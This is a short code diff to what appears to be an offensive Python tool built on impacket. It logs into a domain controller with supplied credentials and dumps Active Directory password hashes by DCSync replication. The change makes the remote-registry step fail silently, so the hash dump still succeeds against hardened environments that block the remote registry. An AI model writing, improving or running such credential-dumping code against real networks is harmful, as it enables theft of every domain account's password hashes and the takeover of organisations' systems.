@@ -51,7 +51,13 @@ def _run_in_process(target, ctx):
         smbConnection.login(ctx.creds["dc_user"], ctx.creds["dc_pass"], ctx.creds["domain"])
 
         remoteOps = RemoteOperations(smbConnection, False, None)
-        remoteOps.enableRegistry()
+        # DRSUAPI replication doesn't need the remote registry (that's the VSS/boot-key
+        # path). Keep it best-effort so a hardened/blocked remote registry doesn't fail
+        # an otherwise-working DCSync with a misleading [ERROR].
+        try:
+            remoteOps.enableRegistry()
+        except Exception:
+            pass
 
         ntdsHashes = NTDSHashes(
             None, None, isRemote=True, history=False,
